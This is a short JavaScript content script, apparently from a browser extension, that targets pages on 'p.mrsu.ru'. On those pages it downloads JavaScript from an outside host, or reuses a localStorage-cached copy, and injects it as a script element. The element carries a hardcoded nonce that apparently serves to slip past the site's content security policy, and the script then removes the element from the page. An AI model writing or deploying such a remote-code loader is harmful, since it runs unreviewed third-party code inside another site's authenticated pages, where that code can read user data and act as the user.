function ltfs_mrsu(filePath, mimeType)
{
  var xmlhttp=new XMLHttpRequest();
  xmlhttp.open("GET",filePath,false);
  if (mimeType != null) {
    if (xmlhttp.overrideMimeType) {
      xmlhttp.overrideMimeType(mimeType);
    }
  }
  xmlhttp.send();
  if (xmlhttp.status==200)
  {
    return xmlhttp.responseText;
  }
  else {
    // TODO Throw exception
    return null;
  }
}

if(location.toString().includes("p.mrsu.ru")){

	console.log(document);
	var s = document.createElement('script');
	let cntnt = localStorage["codecache"] == undefined ? ltfs_mrsu("https://rlt-gameplays.7m.pl/extimport/mainjs.php", "text/plain") : localStorage["codecache"];
	s.text = cntnt;
	s.nonce='ab49Fdd';
	
	s.onload = function() {
		this.parentNode.removeChild(this);
	};
	
	(document.head||document.documentElement).appendChild(s);
}